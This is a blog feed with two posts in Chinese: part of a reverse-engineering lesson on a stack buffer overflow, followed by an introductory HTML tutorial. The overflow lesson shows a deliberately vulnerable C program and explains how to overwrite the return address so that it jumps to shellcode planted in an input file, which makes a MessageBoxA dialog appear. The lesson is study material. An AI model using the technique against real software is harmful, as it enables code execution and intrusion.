<p>注意这里的数值数据和内存数据，使用<mark class="label warning">小端序</mark>。</p>
</li>
<li><p>切换回文本模式，保存为<code>password.txt</code>，用 OllyDbg 调试后，最终栈的状态如表2-3-4。</p>
<p><img data-src="https://i.loli.net/2021/02/03/9O4AnPFaxGiXDy3.png" alt="22.png"></p>
<p><img data-src="https://i.loli.net/2021/02/03/xAo2TadsfMQP7Vc.png" alt="23.png"></p>
</li>
</ol>
</li>
</ol>
<h3 id="2-7-执行Shellcode"><a href="#2-7-执行Shellcode" class="headerlink" title="2.7 执行Shellcode"></a>2.7 执行Shellcode</h3><p>本节将介绍通过栈溢出让进程执行<strong>输入数据中</strong>植入的代码。在上节实验中，我们让函数返回到<code>main</code>函数的验证通过分支的指令。试想一下，如果我们在<code>buffer</code>里包含我们自己想要执行的代码，然后通过返回地址让程序跳转到系统栈里执行，我们岂不是可以让进程去执行本来没有的代码，直接去做其他事情了!</p>
<div class="note warning"><p>如图2.4.1所示，在本节实验中，我们准备向<code>password.txt</code>文件里植入二进制的机器码，并用这段机器码来调用 Windows 的一个 API 函数<code>MessageBoxA</code>， 最终在桌面上弹出一个消息框并显示<code>failwest</code>字样。（即在输入的数据中包含shellcode，然后修改返回地址，使返回地址被修改为shellcode的起地址，<mark class="label danger">数组入栈是将全部数据压入，同时栈顶是数组的第一个元素</mark>。）</p>
</div>



<div class="note danger"><p>这里还应该注意的是正常情况下返回地址是指令<code>ADD ESP 4</code>对应的地址，<mark class="label warning">当函数返回时去从恢复栈的这条指令继续执行，然后是参数、局部变量、被压栈的寄存器、ebp，然后是上一个调用函数的返回地址</mark>。</p>
</div>

<p><img data-src="https://i.loli.net/2021/02/03/AiwuoPbBXIfOz3S.png" alt="24.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span>   <span class="comment">//用于调用LoadLibrary函数装在user32.dll用于植入MessageBosA</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> authenticated;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">44</span>];        <span class="comment">//机器码空间可能大于8因此方便演示，做了扩充</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!!!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);  <span class="comment">//调用MessageBoxA的需要</span></span><br><span class="line">    <span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span>(valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verifycation!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>实验目的</strong>：在<code>password.txt</code>文件中植入二进制的机器码，在<code>password.txt</code>攻击成功时，密码验证程序应该执行植入的代码，并在桌面上弹出一个消息框显示<code>failwest</code>字样。</p>
<div class="note default"><p>在动手之前需要完成的几项工作：</p>
<p>（1）分析并调试漏洞程序，获得淹没返回地址的偏移。</p>
<p>（2）获得<code>buffer</code>的起始地址，并将其写入<code>password.txt</code>的相应偏移处，用来冲刷返回地址。</p>
<p>（3）向<code>password.txt</code>中写入可执行的机器代码，用来调用 API 弹出一个消息框。</p>
</div>



<ol>
<li><p>本节验证程序里<code>verify_password</code>中的缓冲区为44个字节，按照前边实验中对栈结构的分析，我们不难得出栈帧中的状态。</p>
<ul>
<li><p>如果在<code>password.txt</code>中写入恰好44个字符，那么第45个隐藏的截断符<code>null</code>将冲掉<code>authenticaed</code>低字节中的1，从而突破密码验证的限制。我们不妨就用44个字节作为输入来进行动态调试。</p>
</li>
<li><p>出于字节对齐、容易辨认的目的，我们把<code>4321</code>作为个输入单元。</p>
<p><code>buffer[44]</code>共需要11个这样的单元，第12个输入单元将<code>athenticated</code>覆盖；第13个输入单元将前栈帧EBP值覆盖；第14个输入单元将返回地址覆盖。则共需要11组<code>4321</code>，共44个字符，应该就可以绕过验证返回正确消息。此时栈的状态如图2.4.4和表2-4-2。</p>
</li>
</ul>
<p><img data-src="https://i.loli.net/2021/02/03/v1nx7QpDSfsdGLy.png" alt="25.png"></p>
<p><img data-src="https://i.loli.net/2021/02/03/kKBzJ514Nme8Lra.png" alt="26.png"></p>
</li>
<li><p>动态调试的结果证明了前边分析的正确性。我们可以得到以下信息。</p>
<ul>
<li><p><code>buffer</code>数组的起始地址为<code>0x0012FAF0</code>。该该地址靠近栈顶，存放<code>buffer[0]</code>， 此时ESP指针为 <code>0x0012FA9C</code> ；</p>
</li>
<li><p><code> password.txt</code>文件中第53~ 56个字符的 ASCII 码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址。（0-44 -&gt; buffer，45-48-&gt; athenticated，49-52 -&gt; ebp，53-56 -&gt; 返回地址）</p>
</li>
<li><p>也就是说，将<code>buffer</code>的起始地址<code>0x0012FAF0</code>写入<code>password.txt</code>文件中的第<code>53~56</code>个字节，在<code>verify password</code>函数返回时会跳到我们输入的字串开始取指执行。</p>
</li>
</ul>
</li>
<li><p>下面还需要给<code>password.txt</code>中植入机器代码。让程序弹出一个消息框只需要调用<code>Windows</code>的 API 函数<code>MessageBox</code>。MSDN 对这个函数的解释如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBoxA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HwND hWnd，</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR IpText,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">  UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hWnd [in]</code> 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口。</li>
<li><code>lpTex[in]</code> 字符串指针，所指字符串会在消息框中显示。</li>
<li><code>lpCaption [in]</code> 字符串指针，所指字符串将成为消息框的标题。</li>
<li><code>uType [in]</code> 消息框的风格（单按钮、多按钮等），NULL代表默认风格。</li>
</ul>
</li>
<li><p>我们将给出调用这个API的汇编代码，然后翻译成机器代码，用十六进制编辑工具填入<code>password.txt</code>文件。 </p>
<p>用汇编语言调用<code>MessageboxA</code>需要3个步骤：</p>
<p>（1）装载动态链接库<code>user32.dll</code>。 MessageBoxA 是动态链接库user32.dll的导出函数。虽然大多数有图形化操作界面的程序都已经装载了这个库，本实验已预先手动加载了它。</p>
<p>（2）在汇编语言中调用这个函数需要获得这个函数的入口地址。</p>
<p>（3）在调用前需要向栈中按从右向左的顺序压入MessageBoxA的4个参数。</p>
<p><strong>MessageBoxA的入口参数可以通过user32.dll在系统中加载的基址和MessageBoxA在库中的偏移相加得到。</strong></p>
<p><img data-src="https://i.loli.net/2021/02/04/KwUVIAzortPGu4W.png" alt="27.png"></p>
<blockquote>
<p>题外话：熟悉MFC的程序员一定知道，其实系统中并不存在真正的MessagBox函数，对MessageBox这类API的调用最终都将由系统按照参数中字符串的类型选择“A”类函数( ASCII)或者“W”类函数( UNICODE)调用。因此，我们在汇编语言中调用的函数应该是MessageBoxA。 多说一句，其实MessageBoxA的实现只是在设置了 几个不常用参数后直接调用MessageBoxExA。</p>
</blockquote>
</li>
<li><p>将上述汇编指令对应的机器代码以十六进制形式逐字写入<code>password.txt</code>，第53~ 56字节填入<code>buffer</code>的起址<code>0x0012FAF0</code>，其余的字节用<code>0x90</code>（nop指令）填充。</p>
<p><img data-src="https://i.loli.net/2021/02/04/x2SGDJ7OE583Wye.png" alt="28.png"></p>
<div class="note success"><p>因为MessageBoxA 调用的代码执行完成后，没有写用于安全退出的代码的缘故。在植入代码中没有安全地退出，程序会崩溃。<mark class="label success">所以应该在植入代码中安全地退出程序，甚至在植入代码结束后修复堆栈和寄存器，让程序重新回到正常的执行流程</mark>。</p>
</div></li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML-基础</title>
    <url>/post/HTML-basics/</url>
    <content><![CDATA[<p>使用HTML标记实际上也就是使用标签和其属性 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<span id="more"></span>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>HTML 基础</font> </center>






<br>

<br>

<h3 id="一-HTML-初识"><a href="#一-HTML-初识" class="headerlink" title="一. HTML 初识"></a><font color="#FF6347" face="Comic sans MS">一. HTML 初识</font></h3><p>当您保存 HTML 文件时，既可以使用 .htm 也可以使用 .html 扩展名。两者没有区别，完全根据您的喜好。</p>
<br>

<p><strong>HTML标签编写规范</strong></p>
<p>HTML<font color="#FF7F00"><strong>标记不区分大小写</strong></font>。如：<code>&lt;font&gt;</code>、<code>&lt;Font&gt;</code>、<code>&lt;fOnt&gt;</code>。单特殊符号必须小写，如<code>&amp;nbsp</code>。</p>
<p>HTML标记属性可有可无。有的标记是没有属性的，如：<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;title&gt;</code>等</p>
<p>双边标记的内容在开始和结束标签之间，单边标记没有内容。</p>
<p>HTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层。</p>
<br>

<p><font color="#00B2EE"><strong>HTML，Hypertext Markup Language ,超文本标注语言。</strong></font>HTML是一种规范，是一种标准，编写网页的一种标准。<br><font color="#00B2EE"></font></p>
<ul>
<li><strong>超文本：</strong>就是网页上不光有文本，还有图片、音乐、视频等。</li>
<li><strong>标注：</strong>是一种记号，是一种标志。如：红绿灯</li>
<li><strong>语言：</strong>这里的“语言”就是代码，跟所谓“程序语言”一点关系都没有。</li>
</ul>
<p><strong>HTML的主要目的：</strong><font color="#FF7F00"><strong>就是用来显示网页的不同效果、不同部分。如：<code>&lt;b&gt;文本&lt;/b&gt;</code></strong></font></p>
<br>

<br>

<h4 id="1-1-HTML文件结构"><a href="#1-1-HTML文件结构" class="headerlink" title="1.1 HTML文件结构"></a><font color="#3CB371" face="Comic sans MS">1.1 HTML文件结构</font></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;php.cn&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">这里是存放网页内容的</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>


<p><strong>HTML 页面整体构成</strong><br>用浏览器打开任意一个网页，右键选择查看网页源码，就可以看到网站的HTML代码，总结一下，整体结构如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c823abe1bb83.png" alt=" 1.png"></p>
<p><font color="#00B2EE" face="Microsoft YaHei"><strong>一、HTML文件结构的说明：</strong></font></p>
<ul>
<li><p><strong><code>&lt;!DOCTYPE HTML&gt;</code>：</strong>html5标准网页声明，<font color="#FF7F00"><strong>必须放在 HTML 文档的第一行</strong></font>，位于<code>&lt;html&gt;</code>标签之前。声明有助于浏览器中正确显示网页。</p>
</li>
<li><p><strong><code>&lt;html&gt;&lt;/html&gt;</code>：</strong>告诉浏览器，其中的代码用什么格式(图片、视频)来编译。</p>
</li>
<li><p><strong><code>&lt;head&gt;&lt;/head&gt;</code>：</strong>头部中包含的标记是页面的标题、序言、说明等内容，它本身<font color="#FF7F00"><strong>不作为内容来显示</strong></font>，但影响网页显示的效果。</p>
<ol>
<li>下面<font color="#FF7F00"><strong>这些标签可用在 head 部分：<code>&lt;title&gt;</code>,<code>&lt;meta&gt;</code>,  <code>&lt;base&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code></strong></font>。</li>
<li>头部中最常用的标记符是标题标记符<code>&lt;title&gt;页面标题&lt;/title&gt;</code>和<code>&lt;meta&gt;</code>标记符，其中标题标记符用于定义网页的标题，它的内容显示在网页窗口的标题栏中，网页标题可被浏览器用作书签和收藏清单。</li>
<li>设置文档标题和其它在网页中不显示的信息，比如direction方向、语言代码Language Code（实体定义!ENTITY % i18n）、指定字典中的元信息、等等。</li>
</ol>
</li>
<li><p><strong><code>&lt;body&gt;&lt;/body&gt;</code>：</strong>是网页主要内容的显示区域。网页中显示的实际内容均包含在这2个正文标记符之间。正文标记符又称为实体标记。网页中99%的内容都必须放在<code>&lt;body&gt;</code>。只有放在<code>&lt;body&gt;</code>中，最终浏览器翻译以后，才能看见结果。</p>
</li>
</ul>
<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、关于头部<code>&lt;head&gt;&lt;/head&gt;</code>中常用的两个标签<code>&lt;title&gt;&lt;/title&gt;</code>和<code>&lt;meta&gt;</code>：</strong></font></p>
<ol>
<li><p><strong><code>&lt;title&gt;纯文本&lt;/title&gt;</code></strong><font color="#FF7F00"><strong>中只能是纯文本，任何标记都会原封不动的显示。</strong></font></p>
</li>
<li><p>**<code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</code>**功能：告诉浏览器，如何翻译汉字。<br> 1. <strong>http-equiv：</strong>模拟http协议的文件头原信息，主要目的是服务器向客户端返回时，用什么格式显示。<br> 2. <strong>Content-type：</strong>内容类型。<br> 3. <strong>Content：</strong>详细内容类型介绍。<br> 4. <strong>Text&#x2F;html：</strong>网页是text格式，html是文本中的小格式。<br> 5. <strong>Charset：</strong>字符集，主要控制汉字如何显示。<br> 6. <strong>Utf-8：</strong>多国语言编码，什么国家的语言都可以正常显示。</p>
</li>
</ol>
<br />

<br />

<h4 id="1-2-HTML文件组成"><a href="#1-2-HTML文件组成" class="headerlink" title="1.2 HTML文件组成"></a><font color="#3CB371" face="Comic sans MS">1.2 HTML文件组成</font></h4><blockquote>
<p><font color="#FF7F00"><strong>HTML 是什么</strong></font></p>
</blockquote>
<ol>
<li>HTML 是用来描述网页的一种语言。</li>
<li>HTML 不是一种编程语言，而是一种标记语言</li>
<li>标记语言是一套标记标签 (markup tag)</li>
<li>HTML 使用标记标签来描述网页</li>
<li>HTML 文档包含了HTML 标签及文本内容</li>
<li>HTML文档也叫做 web 页面</li>
</ol>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 标签</strong></font></p>
</blockquote>
<ol>
<li>HTML 标记标签通常被称为 HTML 标签 (HTML tag)。</li>
<li>HTML 标签是由尖括号包围的关键词，比如 <code>&lt;html&gt;</code></li>
<li>HTML 标签通常是成对出现的，比如 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code>。也有单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：<code>&lt;br&gt;</code></li>
<li>标签对中的第一个标签是开始标签，第二个标签是结束标签</li>
<li>开始和结束标签也被称为开放标签和闭合标签</li>
<li>标签语法格式：<ol>
<li><strong>双边标签：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;</code></strong></li>
<li><strong>单边标签：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;</code></strong></li>
</ol>
</li>
</ol>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 元素</strong></font></p>
</blockquote>
<ol>
<li>“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.</li>
<li>但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:</li>
<li>HTML 元素:<code>&lt;p&gt;这是一个段落。&lt;/p&gt;</code></li>
</ol>
<hr size="2" color="#00B2EE" width="100%" noshade>

<ul>
<li><p>HTML元素是组成HTML文档最基本的部件，它是用标签来表现的，一般来说，“起始标签”表示元素的开始，“结束标签”表示元素的结束。</p>
</li>
<li><p>HTML元素分为“有内容的元素”和“空元素”两种。</p>
</li>
<li><p>“有内容的元素”是由起始标签、结束标签以及两者之间的元素内容组成的，其中元素内容既可以是需要显示在网页中的文字内容，也可以是其它元素。</p>
</li>
</ul>
<hr size="2" color="#00B2EE" width="100%" noshade>

<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 元素属性</strong></font></p>
</blockquote>
<ol>
<li>HTML 标签可以拥有属性。属性提供了有关 HTML 元素的更多的信息。</li>
<li>属性总是以名称&#x2F;值对的形式出现，比如：<code>name=&quot;value&quot;</code>。</li>
<li>属性值应该始终被包括在<strong>引号内</strong>。双引号是最常用的，不过使用单引号也没有问题。</li>
</ol>
<hr size="2" color="#00B2EE" width="100%" noshade>

<ul>
<li>HTML的元素属性提供了对HTML元素的描述和控制信息，借助于元素属性，HTML网页才会展现丰富多彩且格式美观的内容。</li>
<li>例如要设置<code>&lt;p&gt;</code>元素中文字内容的颜色为红色，字号为30像素，这时就需要用到HTML元素属性了。如在<code>&lt;p&gt;</code>元素名称的尖括号内添加了<code>style=&quot;color:#ff0000;font-size:30px&quot;</code>内容，浏览器就会按照设定的效果来显示内容。</li>
</ul>
<hr size="2" color="#00B2EE" width="100%" noshade>



<br>

<br>

<h3 id="二-HTML-标签"><a href="#二-HTML-标签" class="headerlink" title="二. HTML 标签"></a><font color="#FF6347" face="Comic sans MS">二. HTML 标签</font></h3><br>


<h4 id="2-1-标签介绍"><a href="#2-1-标签介绍" class="headerlink" title="2.1 标签介绍"></a><font color="#3CB371" face="Comic sans MS">2.1 标签介绍</font></h4><p>按功能排序HTML的标签请参考：<font color="#00B2EE">《<a href="http://www.runoob.com/tags/ref-byfunc.html">HTML 标签参考手册- (HTML5 标准)</a>》</font> </p>
<p><strong>HTML标签分两类：</strong>双边标签和单边标签。</p>
<br>

<p><strong>1. 双边标签</strong></p>
<ul>
<li><p>双边标签，是指有开始和结束标签，内容放在开始和结束标签之间。如：<code>&lt;b&gt;内容&lt;/b&gt;</code></p>
</li>
<li><p>“属性”的通俗理解：一个东西总是有一些特征，重量，体积等，这就是一个东西的“属性”</p>
</li>
<li><p><strong>语法格式：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;</code></strong></p>
</li>
</ul>
<br>

<p><strong>2. 单边标签</strong></p>
<ul>
<li><p>单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：<code>&lt;br&gt;</code></p>
</li>
<li><p>单边标签一般起一个特殊的功能。</p>
</li>
<li><p>单边标签常用的有10多个标记。</p>
</li>
<li><p><strong>语法格式：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;</code></strong></p>
</li>
</ul>
<br>

<p>先来看一下双边标签例子，观察<code>&lt;font&gt;&lt;/font&gt;</code>标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;directoree.top&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1553.png&quot;</span>&gt;&gt;</span><br><span class="line">        &lt;h1&gt;第一个，哈哈哈哈&lt;/h1&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;看看我有什么特别的&lt;/font&gt;&lt;/font&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c828faaaf57d.jpg" alt="3.png"></p>
<br>

<p>再来看一下单边标签例子，观察<code>&lt;br&gt;</code>标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;treecatee.github.io&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1553.png&quot;</span>&gt;&gt;</span><br><span class="line">        &lt;h1&gt;第二个，哈哈哈哈&lt;/h1&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;再看看我有什么特别的&lt;/font&gt;</span><br><span class="line">       &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;再看看我有什么特别的&lt;/font&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c828fa9efed8.jpg" alt="4.png"></p>
<br>

<p><strong>HTML标签编写规范</strong></p>
<p>HTML<font color="#FF7F00"><strong>标记不区分大小写</strong></font>。如：<code>&lt;font&gt;</code>、<code>&lt;Font&gt;</code>、<code>&lt;fOnt&gt;</code>。单特殊符号必须小写，如<code>&amp;nbsp</code>。</p>
<p>HTML标记属性可有可无。有的标记是没有属性的，如：<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;title&gt;</code>等</p>
<p>双边标记的内容在开始和结束标签之间，单边标记没有内容。</p>
<p>HTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层，不能交叉嵌套。</p>
<br>

<hr size="2" color="#00B2EE" width="100%" noshade>
<hr size="2" color="#00B2EE" width="100%" noshade>



<br>


<h4 id="2-2-常用标签-文本"><a href="#2-2-常用标签-文本" class="headerlink" title="2.2 常用标签-文本"></a><font color="#3CB371" face="Comic sans MS">2.2 常用标签-文本</font></h4><ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;!DOCTYPE HTML&gt;</code></strong> html5标准网页声明（必须有）</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;html&gt;&lt;/html&gt;</code></strong> 声明代码格式（必须有）</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;head&gt;&lt;/head&gt;</code></strong> 文件头（必须有）<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;title&gt;&lt;/title&gt;</code></strong> 标题（必须有）</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;meta&gt;</code></strong> 元数据  …..</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;body&gt;&lt;/body&gt;</code></strong>&amp;emsp;**<code>&lt;h1&gt; - &lt;h6&gt;</code>**（必须有）</li>
<li><input disabled="" type="checkbox"> 文本标签<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;b&gt;&lt;/b&gt;</code></strong> 加粗</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;i&gt;&lt;/i&gt;</code></strong> 斜体</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;u&gt;&lt;/u&gt;</code></strong> 下划线</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;s&gt;&lt;/s&gt;</code></strong> 删除线</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;sup&gt;&lt;/sup&gt;</code></strong> 上标</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;sub&gt;&lt;/sub&gt;</code></strong> 下标</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;font&gt;&lt;/font&gt;</code></strong> 字体标记<ul>
<li><input disabled="" type="checkbox"> <strong><code>size</code></strong> 大小(1 -&gt; 7)</li>
<li><input disabled="" type="checkbox"> <strong><code>color</code></strong> 颜色</li>
<li><input disabled="" type="checkbox"> <strong><code>face</code></strong> 字体</li>
</ul>
</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;p&gt;&lt;/p&gt;</code></strong> 表示一个段落</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;br&gt;</code></strong> 换行 </li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;hr&gt;</code></strong> 段落分割线 </li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;pre&gt;&lt;/pre&gt;</code> <code>&lt;code&gt;&lt;/code&gt;</code></strong> 定义预格式化的文本和格式代码块</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;strong&gt;</code>和<code>&lt;em&gt;</code></strong> 加粗和斜体（强调）</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;span&gt;&lt;/span&gt;</code></strong> 对文档中的行内元素进行组合</li>
</ul>
<br>

<p><font size="4" face="Microsoft YaHei"><strong>1. <code>&lt;head&gt;&lt;/head&gt;</code>头标签</strong></font></p>
<blockquote>
<p>**<code>&lt;head&gt;</code>**内的元素可包含脚本，指示浏览器在何处可以找到样式表，提供元信息等。<br>可添加到head部分的标签：<code>&lt;title&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;meta&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;style&gt;</code>:</p>
</blockquote>
<ul>
<li><strong><code>&lt;title&gt;</code>：</strong>指定整个网页的标题，在浏览器最上方显示。</li>
<li><strong><code>&lt;base&gt;</code>：</strong>为页面上的所有链接规定默认地址或默认目标(target)。</li>
<li><strong><code>&lt;meta&gt;</code>：</strong>提供有关页面的基本信息。</li>
<li><strong><code>&lt;script&gt;</code>：</strong>定义客户端脚本，如JavaScript。</li>
<li><strong><code>&lt;style&gt;</code>：</strong>定义内部样式表与网页的关系。</li>
</ul>
<br>

<ol>
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;title&gt;&lt;/title&gt;</code>：标签定义文档的标题。</strong></font> <br></li>
</ol>
<pre><code> 1. title 元素在所有 HTML/XHTML 文档中都是必需的，无属性；
 4. `&lt;title&gt;纯文本&lt;/title&gt;`中间只能是纯文本；
 2. title 元素能够：
    1. 定义浏览器工具栏中的标题
    2. 提供页面被添加到收藏夹时显示的标题
    3. 显示在搜索引擎结果中的页面标题
    4. 告诉用户和搜索引擎这个网页的主要内容是什么，
    5. 搜索引擎可以通过网页标题，迅速的判断出当前网页的主题。
</code></pre>
<br>

<hr size="2" color="#00B2EE" width="100%" noshade>


<ol start="2">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;meta&gt;</code>：标签</strong></font> <br><ol>
<li><code>&lt;meta&gt;</code> 标签提供关于 HTML 文档的元数据。</li>
<li>元数据不会显示在页面上，但是对于机器是可读的。</li>
<li>典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。</li>
<li><code>&lt;meta&gt;</code> 标签始终只能位于 head 元素中。但是头部可以有多个<code>&lt;meta&gt;</code> 标签。</li>
<li>元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。</li>
<li><strong>包含属性：（有属性就必须有对应的值(content)）</strong><ol>
<li><font color="#FF7F00"><strong>content：</strong></font>必须属性。</li>
<li>定义与 http-equiv 或 name 属性相关的元信息，content中的内容其实就是各个参数的变量值。</li>
<li>变量值可以有多个，用半角逗号<code>,</code>隔开。</li>
<li><font color="#FF7F00"><strong>http-equiv：</strong></font>可选属性。可选值：</li>
<li><strong><code>content-type</code>，内容类别</strong>，用于设置页面的类别和语言字符集。编写格式<code>&lt;meta http-equiv=“content-type” context=“text/html”；charset=“gb2312”/&gt;</code>，content属性的值代表页面采用HTML代码输出，字符集为gb2312（简体中文），国际化网站开发的话，为了字符统一，建议charset采用utf-8.</li>
